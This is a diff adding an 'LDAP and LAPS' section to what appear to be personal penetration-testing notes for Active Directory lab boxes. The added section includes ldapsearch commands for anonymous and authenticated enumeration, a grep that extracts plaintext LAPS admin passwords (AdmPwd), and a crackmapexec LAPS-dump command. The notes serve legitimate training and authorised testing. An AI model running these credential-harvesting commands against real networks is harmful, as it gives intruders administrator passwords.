@@ -136,6 +136,34 @@ Get-ObjectAcl -Identity "${GROUP}" | ? {$_.ActiveDirectoryRights -eq "GenericAll
 
 This gets everyone with the `GenericAll` permission on the group `$GROUP`.
 
+## LDAP and LAPS
+
+If autorecon reveals the AD being setup such that you can enumerate ldap without credentials, consider doing something like:
+
+```
+ldapsearch -x -H ldap://${RHOST}  -b "DC=${DOMAIN_NAME},DC=${DOMAIN_TLD}"
+```
+
+There have been boxes where doing this will reveal a plaintext password (e.g. in the description of a user).
+
+If you have valid credentials, enumeration can be done with that as well:
+
+```
+ldapsearch -x -H ldap://${RHOST} -D "${DOMAIN_NAME}\${DOMAIN_USER}" -w "${PW}"  -b "DC=${DOMAIN_NAME},DC=${DOMAIN_TLD}"
+```
+
+In one instance, a box had LAPS installed, allowing me to read the pw of an Admin user with:
+
+```
+ldapsearch -x -H ldap://${RHOST} -D "${DOMAIN_NAME}\${DOMAIN_USER}" -w "${PW}"  -b "DC=${DOMAIN_NAME},DC=${DOMAIN_TLD}" | grep AdmPwd
+```
+
+supposedly, this crackmapexec command dumps all users available through LAPS.
+I was not able to get it to work with the previously mentioned box, though:
+
+```
+crackmapexec ldap ${RHOST} -u ${DOMAIN_USER} -p ${PW} --kdcHost ${RHOST} -M laps
+```
 
 
 ## Bloodhound
